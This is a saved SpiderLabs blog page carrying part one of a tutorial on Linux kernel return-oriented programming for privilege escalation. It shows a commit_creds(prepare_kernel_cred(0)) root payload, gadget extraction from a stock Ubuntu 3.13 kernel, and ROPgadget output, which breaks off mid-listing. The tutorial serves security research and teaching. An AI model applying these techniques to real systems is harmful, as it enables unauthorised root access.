                                                                <a href="https://www.trustwave.com/en-us/capabilities/by-industry/financial-sector/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="financial-services" data-ga-value="1">Financial Sector</a>
                                                            </li>
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/capabilities/by-industry/government/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="government" data-ga-value="1">Government</a>
                                                            </li>
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/capabilities/by-industry/healthcare/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="healthcare" data-ga-value="1">Healthcare</a>
                                                            </li>
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/capabilities/by-industry/hotels/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="hotels" data-ga-value="1">Hotels</a>
                                                            </li>
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/capabilities/by-industry/legal/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="legal" data-ga-value="1">Legal</a>
                                                            </li>
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/capabilities/by-industry/payment-services/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="payment-services" data-ga-value="1">Payment Services</a>
                                                            </li>
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/capabilities/by-industry/restaurants/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="restaurants" data-ga-value="1">Restaurants</a>
                                                            </li>
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/capabilities/by-industry/retail/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="retail" data-ga-value="1">Retail</a>
                                                            </li>
                                                        </ul>
                                                    </div>
                                                    <div class="p-4 p-xl-0 border-bottom border-xl-bottom-0">
                                                        <h6 class="border-xl-bottom pb-xl-2">By Regulation</h6>
                                                        <ul class="list-unstyled row row-cols-1 row-cols-xl-3 gy-3">
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/capabilities/by-mandate/data-privacy/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="data-privacy" data-ga-value="1">Data Privacy</a>
                                                            </li>
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/capabilities/by-mandate/cmmc/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="cmmc" data-ga-value="1">CMMC</a>
                                                            </li>
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/capabilities/by-mandate/fisma/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="fisma" data-ga-value="1">FISMA</a>
                                                            </li>
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/capabilities/by-mandate/gdpr/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="gdpr" data-ga-value="1">GDPR</a>
                                                            </li>
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/capabilities/by-mandate/glba/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="glba" data-ga-value="1">GLBA</a>
                                                            </li>
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/capabilities/by-mandate/hipaa/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="hipaa" data-ga-value="1">HIPAA</a>
                                                            </li>
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/capabilities/by-mandate/iso/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="iso" data-ga-value="1">ISO</a>
                                                            </li>
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/capabilities/by-mandate/pci/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="pci" data-ga-value="1">PCI</a>
                                                            </li>
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/capabilities/by-mandate/sox/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="sox" data-ga-value="1">SOX</a>
                                                            </li>
                                                        </ul>
                                                    </div>
                                                </div>
                                                <div class="col-xl-5">
                                                    <div class="p-4 p-xl-0 border-bottom border-xl-bottom-0">
                                                        <h6 class="border-xl-bottom pb-xl-2">By Topic</h6>
                                                        <ul class="list-unstyled row row-cols-1 gy-4 gy-xl-6">
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/mitigate-microsoft-exchange-server-attacks/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="microsoft-exchange-server-attacks" data-ga-value="1">
                                                                    Microsoft Exchange Server Attacks
                                                                    <span class="d-block small text-muted">Stay protected against emerging threats</span>
                                                                </a>
                                                            </li>
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/capabilities/by-topic/rapidly-secure-temporary-infrastructures/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="rapidly-secure-new-environments" data-ga-value="1">
                                                                    Rapidly Secure New Environments
                                                                    <span class="d-block small text-muted">Security for rapid response situations</span>
                                                                </a>
                                                            </li>
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/capabilities/by-topic/cloud-security/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="securing-the-cloud" data-ga-value="1">
                                                                    Securing the Cloud
                                                                    <span class="d-block small text-muted">Safely navigate and stay protected</span>
                                                                </a>
                                                            </li>
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/capabilities/by-topic/securing-the-iot-landscape/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="securing-the-iot-landscape" data-ga-value="1">
                                                                    Securing the IoT Landscape
                                                                    <span class="d-block small text-muted">Test, monitor and secure network objects </span>
                                                                </a>
                                                            </li>
                                                        </ul>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </nav>
                                </div>
                            </li>
                            <li>
                                <button class="site-header-nav-control site-header-nav-btn">Why Trustwave</button>
                                <div class="site-header-subnav-wrap">
                                    <button class="site-header-back-btn"><i class="fe fe-arrow-left me-4"></i> Why Trustwave</button>
                                    <nav class="site-header-subnav site-header-subnav-center" id="tw-subnav-why">
                                        <div class="p-4 p-xl-7 overflow-hidden">
                                            <ul class="list-unstyled row row-cols-1 gy-4 gy-xl-6">
                                                <li class="col">
                                                    <a href="https://www.trustwave.com/en-us/company/about-us/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="the-trustwave-approach" data-ga-value="1">
                                                        The Trustwave Approach
                                                        <span class="d-block small text-muted">A focus on threat detection and response</span>
                                                    </a>
                                                </li>
                                                <li class="col">
                                                    <a href="https://www.trustwave.com/en-us/company/about-us/spiderlabs/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="trustwave-spiderlabs-team" data-ga-value="1">
                                                        Trustwave SpiderLabs Team
                                                        <span class="d-block small text-muted">Researchers, ethical hackers and responders</span>
                                                    </a>
                                                </li>
                                                <li class="col">
                                                    <a href="https://www.trustwave.com/en-us/company/about-us/trustwave-fusion-platform/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="trustwave-fusion-platform" data-ga-value="1">
                                                        Trustwave Fusion Platform
                                                        <span class="d-block small text-muted">Unprecedented security visibility and control</span>
                                                    </a>
                                                </li>
                                                <li class="col">
                                                    <a href="https://www.trustwave.com/en-us/company/about-us/spiderlabs-fusion-center/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="spiderlabs-fusion-center" data-ga-value="1">
                                                        SpiderLabs Fusion Center
                                                        <span class="d-block small text-muted">Our cybersecurity command center</span>
                                                    </a>
                                                </li>
                                                <li class="col">
                                                    <a href="https://www.trustwave.com/en-us/company/about-us/security-operations-centers/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="security-operations-centers" data-ga-value="1">
                                                        Security Operations Centers
                                                        <span class="d-block small text-muted">Distributed worldwide defense nodes</span>
                                                    </a>
                                                    
                                            </li></ul>
                                        </div>
                                    </nav>
                                </div>
                            </li>
                            <li>
                                <button class="site-header-nav-control site-header-nav-btn">Partners</button>
                                <div class="site-header-subnav-wrap">
                                    <button class="site-header-back-btn"><i class="fe fe-arrow-left me-4"></i> Partners</button>
                                    <nav class="site-header-subnav site-header-subnav-center" id="tw-subnav-partners">
                                        <div class="border-bottom p-4 p-xl-7 overflow-hidden">
                                            <ul class="list-unstyled row row-cols-1 gy-4 gy-xl-6">
                                                <li class="col">
                                                    <a href="https://www.trustwave.com/en-us/company/alliance-ecosystem/technology-partners/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="global-technology-partners" data-ga-value="1">
                                                        Technology Alliance Partners
                                                        <span class="d-block small text-muted">Key alliances who align and support our ecosystem of security offerings</span>
                                                    </a>
                                                </li>
                                            </ul>
                                        </div>
                                        <div class="p-4 p-xl-7 overflow-hidden">
                                            <ul class="list-unstyled row row-cols-1 gy-4 gy-xl-6">
                                                <li class="col">
                                                    <a href="https://www.trustwave.com/en-us/partnerone/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="trustwave-partnerone-program" data-ga-value="1">
                                                        Trustwave PartnerOne Program
                                                        <span class="d-block small text-muted">Join forces with Trustwave to protect against the most advance cybersecurity threats</span>
                                                    </a>
                                                </li>
                                                <li class="col">
                                                    <div class="row gx-4">
                                                        <div class="col-6"><a href="https://trustwave.ziftone.com/#/page/reg" target="_blank" class="btn btn-primary btn-sm w-100" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="register" data-ga-value="1">Register</a></div>
                                                        <div class="col-6"><a href="https://trustwave.ziftone.com/#/page/logged-out-home" target="_blank" class="btn btn-outline-darkest btn-sm w-100" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="login" data-ga-value="1">Login</a></div>
                                                    </div>
                                                </li>
                                            </ul>
                                        </div>
                                    </nav>
                                </div>
                            </li>
                            <li>
                                <button class="site-header-nav-control site-header-nav-btn">Resources</button>
                                <div class="site-header-subnav-wrap">
                                    <button class="site-header-back-btn"><i class="fe fe-arrow-left me-4"></i> Resources</button>
                                    <nav class="site-header-subnav site-header-subnav-center" id="tw-subnav-resources">
                                        <div class="p-xl-7 overflow-hidden">
                                            <div class="row">
                                                <div class="col-xl-6">
                                                    <div class="p-4 p-xl-0 mb-xl-7 border-bottom border-xl-bottom-0">
                                                        <h6 class="border-xl-bottom pb-xl-2">Blogs</h6>
                                                        <ul class="list-unstyled row row-cols-1 gy-3">
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/resources/blogs/trustwave-blog/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="trustwave-blog" data-ga-value="1">Trustwave Blog</a>
                                                            </li>
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="spiderlabs-blog" data-ga-value="1">SpiderLabs Blog</a>
                                                            </li>
                                                        </ul>
                                                    </div>
                                                </div>
                                                <div class="col-xl-6">
                                                    <div class="p-4 p-xl-0 mb-xl-7 border-bottom border-xl-bottom-0">
                                                        <h6 class="border-xl-bottom pb-xl-2">Upcoming</h6>
                                                        <ul class="list-unstyled row row-cols-1 gy-3">
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/resources/upcoming/webinars/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="webinars" data-ga-value="1">Webinars</a>
                                                            </li>
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/resources/upcoming/events/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="events" data-ga-value="1">Events</a>
                                                            </li>
                                                        </ul>
                                                    </div>
                                                </div>
                                                <div class="col-12">
                                                    <div class="p-4 p-xl-0 mb-xl-7 border-bottom border-xl-bottom-0">
                                                        <h6 class="border-xl-bottom pb-xl-2">Media &amp; Assets</h6>
                                                        <ul class="list-unstyled row row-cols-1 row-cols-xl-2 gy-3">
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/resources/library/?type=doc&amp;topics=&amp;categories=&amp;tags=&amp;vidcats=&amp;sort=Newest" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="document-library" data-ga-value="1">Document Library</a>
                                                            </li>
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/resources/library/?type=video&amp;topics=&amp;categories=&amp;tags=&amp;vidcats=&amp;sort=Newest" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="video-library" data-ga-value="1">Video Library</a>
                                                            </li>
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/resources/library/?type=doc&amp;topics=&amp;categories=Analyst%20Report&amp;tags=&amp;vidcats=&amp;sort=Newest" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="analyst-reports" data-ga-value="1">Analyst Reports</a>
                                                            </li>
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/resources/library/?type=webinar&amp;topics=&amp;categories=&amp;tags=&amp;vidcats=&amp;sort=Newest" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="webinar-replays" data-ga-value="1">Webinar Replays</a>
                                                            </li>
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/resources/library/?type=doc&amp;topics=&amp;categories=Case%20Study&amp;tags=&amp;vidcats=&amp;sort=Newest" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="case-studies" data-ga-value="1">Case Studies</a>
                                                            </li>
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/resources/security-resources/special-offers/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="trials-and-evaluations" data-ga-value="1">Trials &amp; Evaluations</a>
                                                            </li>
                                                        </ul>
                                                    </div>
                                                </div>
                                                <div class="col-xl-6">
                                                    <div class="p-4 p-xl-0 border-bottom border-xl-bottom-0">
                                                        <h6 class="border-xl-bottom pb-xl-2">Notices</h6>
                                                        <ul class="list-unstyled row row-cols-1 gy-3">
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/resources/security-resources/security-advisories/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="security-advisories" data-ga-value="1">Security Advisories</a>
                                                            </li>
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/resources/security-resources/software-updates/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="software-updates" data-ga-value="1">Software Updates</a>
                                                            </li>
                                                        </ul>
                                                    </div>
                                                </div>
                                                <div class="col-xl-6">
                                                    <div class="p-4 p-xl-0">
                                                        <h6 class="border-xl-bottom pb-xl-2">Help</h6>
                                                        <ul class="list-unstyled row row-cols-1 gy-3">
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/company/contact/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="contact" data-ga-value="1">Contact</a>
                                                            </li>
                                                            <li class="col">
                                                                <a href="https://www.trustwave.com/en-us/company/support/" class="d-block text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="support" data-ga-value="1">Support</a>
                                                            </li>
                                                        </ul>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </nav>
                                </div>
                            </li>
                        </ul>
                    </nav>
                    <nav class="site-header-nav site-header-nav-secondary">
                        <ul class="px-7 py-6 p-xl-0">
                            <li class="py-2 p-xl-0 me-xl-3">
                                <button class="site-header-nav-control btn btn-sm w-100 btn-outline-darkest">Login</button>
                                <div class="site-header-subnav-wrap">
                                    <button class="site-header-back-btn"><i class="fe fe-arrow-left me-4"></i> Login</button>
                                    <nav class="site-header-subnav site-header-subnav-center" id="tw-subnav-login">
                                        <div class="px-10 py-7">
                                            <img src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/fusion-logo-color.svg" class="img-fluid">
                                        </div>
                                        <div class="px-7 pb-6">
                                            <a href="https://fusion.trustwave.com/" target="_blank" class="btn btn-primary d-block" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="fusion-platform-login" data-ga-value="1">Fusion Platform Login</a>
                                        </div>
                                        <div class="px-7 pb-6 text-center small">
                                            <a href="https://www.trustwave.com/en-us/company/about-us/trustwave-fusion-platform/" class="text-decoration-none" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="trustwave-fusion-platform" data-ga-value="1">What is the Trustwave Fusion Platform?</a>
                                        </div>
                                        <ul class="list-unstyled border-top px-7 py-6">
                                            <li class="py-2">
                                                <a href="https://segconsole.trustwave.com/UserLogin.aspx" target="_blank" class="btn btn-sm btn-outline-darkest d-block" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="mailmarshal-seg-login" data-ga-value="1">MailMarshal SEG Login</a>
                                            </li>
                                            <li class="py-2">
                                                <a href="https://login.trustwave.com/portal-core/home" target="_blank" class="btn btn-sm btn-outline-darkest d-block" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="legacy-trustkeeper-login" data-ga-value="1">Legacy TrustKeeper Login</a>
                                            </li>
                                        </ul>
                                    </nav>
                                </div>
                            </li>
                            <li class="py-2 p-xl-0">
                                <button class="site-header-nav-control btn btn-primary btn-sm w-100">Incident Response</button>
                                <div class="site-header-subnav-wrap">
                                    <button class="site-header-back-btn"><i class="fe fe-arrow-left me-4"></i> Incident Response</button>
                                    <nav class="site-header-subnav site-header-subnav-right" id="tw-subnav-ir">
                                        <div class="px-4 px-xl-7 pt-4 pt-xl-7 pb-4">
                                            <h4>Experiencing a security breach?</h4>
                                            <p>Get access to immediate incident response assistance.</p>
                                            <h5 class="text-primary mb-0">24 Hour Hotlines</h5>
                                        </div>
                                        <ul class="list-unstyled border-top">
                                            <li class="py-3 px-4 px-xl-7 border-bottom">
                                                <div class="row align-items-center g-0">
                                                    <div class="col-5"><h6 class="mb-0">Americas</h6></div>
                                                    <div class="col-7 text-end">+1 (312) 598-1431</div>
                                                </div>
                                            </li>
                                            <li class="py-3 px-4 px-xl-7 border-bottom">
                                                <div class="row align-items-center g-0">
                                                    <div class="col-5"><h6 class="mb-0">EMEA</h6></div>
                                                    <div class="col-7 text-end">+44 175 477-2059</div>
                                                </div>
                                            </li>
                                            <li class="py-3 px-4 px-xl-7 border-bottom">
                                                <div class="row align-items-center g-0">
                                                    <div class="col-5"><h6 class="mb-0">Australia</h6></div>
                                                    <div class="col-7 text-end">1800 401 792</div>
                                                </div>
                                            </li>
                                            <li class="py-3 px-4 px-xl-7 border-bottom">
                                                <div class="row align-items-center g-0">
                                                    <div class="col-5"><h6 class="mb-0">Singapore</h6></div>
                                                    <div class="col-7 text-end">800 101 3355</div>
                                                </div>
                                            </li>
                                        </ul>
                                        <div class="px-7 py-6">
                                            <a href="https://www.trustwave.com/en-us/company/contact/security-breach/" class="btn btn-primary d-block" data-ga-hittype="event" data-ga-category="main_menu" data-ga-action="click" data-ga-label="recommended-actions" data-ga-value="1">Recommended Actions</a>
                                        </div>
                                    </nav>
                                </div>
                            </li>
                        </ul>
                    </nav>
                </div>
            </div>
        </div>
    </div>
</header>

<div class="loading-indicator">
    <div class="loading-content">
        <span class="loading-graphic"></span>
        <span class="loading-text">Loading...</span>
    </div>
</div>

    <main class="site-main">

        

<section class="section bg-brand-secondary bg-gradient-horizontal section-padding-top-none section-padding-bottom-none angle-bottom angle-bottom-gray-lightest angle-bottom-front">
    <span class="angle-top-placeholder"></span><span class="angle-bottom-placeholder"></span>
    <div class="page-intro">
        <div class="container">
            <div class="row">
                <div class="col-md-10 col-md-offset-1 col-lg-8 col-lg-offset-2">
                    <h5 class="page-intro-type">Blogs &amp; Stories</h5>
                    <h1 class="page-intro-title">SpiderLabs Blog</h1>
                </div>
            </div>
            <div class="row">
                <div class="col-md-10 col-md-offset-1 col-lg-8 col-lg-offset-2">
                    <p class="page-intro-description">Attracting more than a half-million annual readers, this is the security community's go-to destination for technical breakdowns of the latest threats, critical vulnerability disclosures and cutting-edge research.</p>
                </div>
            </div>
        </div>
    </div>
</section>

<section class="section bg-gray-lightest">
    <span class="angle-top-placeholder"></span><span class="angle-bottom-placeholder"></span>
    <div class="container">

        <div class="row">
            <div class="col-lg-10 col-lg-offset-1">
                <div class="blog-post-single">
                    <article class="blog-post" itemscope="" itemtype="http://schema.org/Blog">
                        <div class="card">
                            <div class="card-body">
                                <div class="blog-post-header">
                                        <h1 class="blog-post-title mbm" itemprop="name">Linux Kernel ROP - Ropping your way to # (Part 1)</h1>
                                    <div class="blog-post-meta">
                                            <div class="blog-post-date"><i class="material-icons">access_time</i><span itemprop="datePublished">June 10, 2016</span></div>
                                                                                    <div class="blog-post-author" itemprop="creator" itemscope="" itemtype="http://schema.org/Person"><i class="material-icons">person_outline</i><span itemprop="name">Vitaly Nikolenko</span></div>
                                        <div class="blog-post-share">
                                            <i class="material-icons">share</i>
                                            <div class="pull-left">
                                                <ul class="share-icons custom_images">
                                                    <li><a href="https://twitter.com/share?url=https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/linux-kernel-rop-ropping-your-way-to-part-1/&amp;text=Linux%20Kernel%20ROP%20-%20Ropping%20your%20way%20to%20#%20(Part%201)+-+Trustwave" data-toggle="tooltip" title="" target="_blank" data-original-title="Tweet on Twitter"><img src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/twitter.svg" alt="Twitter"></a></li>
                                                    <li><a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/linux-kernel-rop-ropping-your-way-to-part-1/&amp;title=Linux%20Kernel%20ROP%20-%20Ropping%20your%20way%20to%20#%20(Part%201)" data-toggle="tooltip" title="" target="_blank" data-original-title="Share on LinkedIn"><img src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/linkedin.svg" alt="LinkedIn"></a></li>
                                                    <li><a href="https://www.facebook.com/sharer/sharer.php?u=https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/linux-kernel-rop-ropping-your-way-to-part-1/" data-toggle="tooltip" title="" target="_blank" data-original-title="Share on Facebook"><img src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/facebook.svg" alt="Facebook"></a></li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="blog-post-content">
<h4>Kernel ROP</h4>
<p>In-kernel ROP (Return Oriented Programming) is a useful technique that is often used to bypass restrictions associated with non-executable memory regions. For example, on default kernels<sup><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/linux-kernel-rop-ropping-your-way-to-part-1/#fn1" id="r1">1</a></sup>, it presents a practical approach for bypassing kernel and user address separation mitigations such as SMEP (Supervisor Mode Execution Protection) on recent Intel CPUs.</p>
<p>The goal of this tutorial is to demonstrate how a kernel ROP chain can be constructed to elevate user privileges. As the outcome, the following requirements need to be satisfied:</p>
<ul><li>Execute a privilege escalation payload</li><li>Data residing in user space may be referenced (i.e., "fetching" data from user space is allowed)</li><li>Instructions residing in user space may not be executed</li></ul>
<p>In typical <a href="http://cyseclabs.com/slides/smep_bypass.pdf">ret2usr</a> attacks, the kernel execution flow is redirected to a user-space address containing the privilege escalation payload:</p>
<pre>void __attribute__((regparm(3))) payload() {
        commit_creds(prepare_kernel_cred(0);
}
</pre>
<p>The above privilege escalation payload allocates a new credential struct (with uid = 0, gid = 0, etc.) and applies it to the calling process. We can construct a ROP chain that will perform the above operations without executing any instructions residing in user space, i.e., without setting the program counter to any user-space memory addresses. The end goal is to execute the entire privilege escalation payload in kernel space using a ROP chain. This is may not be required in practice, however. For example, in order to bypass SMEP, it is sufficient to flip the SMEP bit using a ROP chain and then a standard privilege escalation payload can be executed in user space.</p>
<p>The ROP chain based on the above payload should look similar to the following:</p>
<center><a class="asset-img-link" href="https://www.trustwave.com/images/slblog-03-02-2018-10-57-10/spiderlabs/72b919b7-87bb-4312-97ea-b59fe4690b2e.png" style="display: inline;"><img alt="Rop_chain" border="0" class="asset  asset-image at-xid-6a0133f264aa62970b01b8d1f511f2970c img-responsive" src="./2016 - Linux Kernel ROP - Ropping your way to # (Part 1)_files/1928ab75-dcd9-423f-a2ff-83e9f5b64f68.png" title="Rop_chain"></a></center>
<p><br>Using the x86_64 calling convention, the first argument to a function is passed in the <code>%rdi</code> register. Hence, the first instruction in the ROP chain pops the null value off the stack. This value is then passed as the first argument to <code>prepare_kernel_cred()</code>. A pointer to the new <code>cred</code> struct will be stored in <code>%rax</code> which can then be moved to <code>%rdi</code> again and passed as the first argument to <code>commit_creds()</code>. For now, we have deliberately skipped some details regarding returning to user space once the credentials are applied. We will discuss these details later in the "Fixating" section in Part 2 of this tutorial.</p>
<p>In this part, we will discuss how to find useful gadgets and construct a privilege escalation ROP chain. We will then describe the vulnerable driver code that is later used (in Part 2 of this tutorial) to demonstrate the ROP chain in practice.</p>
<h4>Test System</h4>
<p>For the rest of this tutorial, we will be using Ubuntu 12.04.5 LTS (x64) with the following stock kernel:</p>
<pre>vnik@ubuntu:~$ uname -a
Linux ubuntu 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:51:20 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
</pre>
<p>If you would like to follow along and use the same kernel, all the addresses of ROP gadgets should be identical to ours.</p>
<h4>Gadgets</h4>
<p>Similar to user-space applications, ROP gadgets can be simply extracted from the kernel binary. However, we need to consider the following:</p>
<ol><li>We need the ELF (vmlinux) image to extract gadgets from. If we are using the <code>/boot/vmlinuz*</code> image, it needs to be decompressed first, and</li><li>A tool specifically designed for extracting ROP gadgets is preferred.</li></ol>
<p><code>/boot/vmlinuz*</code> is a compressed kernel image (various compression algorithms are used). It can be extracted using the <code>extract-vmlinux</code> script located in the <a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">kernel tree</a>.</p>
<pre>vnik@ubuntu:~$ sudo file /boot/vmlinuz-4.2.0-16-generic 
/boot/vmlinuz-4.2.0-16-generic: Linux kernel x86 boot executable bzImage, version 4.2.0-16-generic (buildd@lcy01-07) #19-Ubuntu SMP Thu Oct 8 15:, RO-rootFS, swap_dev 0x6, Normal VGA
vnik@ubuntu:~$ sudo ./extract-vmlinux /boot/vmlinuz-3.13.0-32-generic &gt; vmlinux
vnik@ubuntu:~$ file vmlinux 
vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=0x32143d561875c4e5f3229003aca99c880e2bedb2, stripped
</pre>
<p>ROP techniques take advantage of code misalignment to identify new gadgets. This is possible due to x86 language density, i.e., the x86 instruction set is large enough (and instructions have different lengths), that almost any sequence of bytes can be interpreted as a valid instruction. For example, depending on the offset, the following instructions can be interpreted differently (note that the second instruction represents a useful stack pivot):</p>
<pre>0f 94 c3; sete   %bl
   94 c3; xchg eax, esp; ret
</pre>
<p>Simply running <code>objdump</code> against the uncompressed kernel image and then grepping for gadgets, will only produce a small subset of all available gadgets (since we are working with aligned addresses only). It is worth mentioning that in a majority of cases, however, this is sufficient to find the required gadgets.</p>
<p>A more efficient approach is to use a tool specifically designed for identifying gadgets in ELF binaries. For example, <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a> can be used to identify all available gadgets:</p>
<pre>vnik@ubuntu:~/ROPgadget$ ./ROPgadget.py --binary ./vmlinux &gt; ~/ropgadget 
vnik@ubuntu:~/ROPgadget$ tail ~/ropgadget 
Gadgets information
============================================================
0xffffffff810c108c : adc ah, ah ; add byte ptr [rax - 0x77], cl ; ret
0xffffffff81054c3a : adc ah, ah ; xor al, byte ptr [rax] ; pop rbp ; ret
0xffffffff815abb0a : adc ah, al ; lcall ptr [rbx + 0x41] ; pop rsp ; xor eax, eax ; pop rbp ; ret
0xffffffff81b0d595 : adc ah, al ; ljmp ptr [rcx + rax*4 - 9] ; call rax
0xffffffff8112fc05 : adc ah, bh ; add byte ptr [rax - 0x77], cl ; in eax, 0x5d ; ret
0xffffffff811965e9 : adc ah, bh ; lcall ptr [rbx + 0x41] ; pop rsp ; xor eax, eax ; pop rbp ; ret
0xffffffff81495bba : adc ah, bh ; mov esi, 0xc7c748ff ; loopne 0xffffffff81495c47 ; retf -0x177f
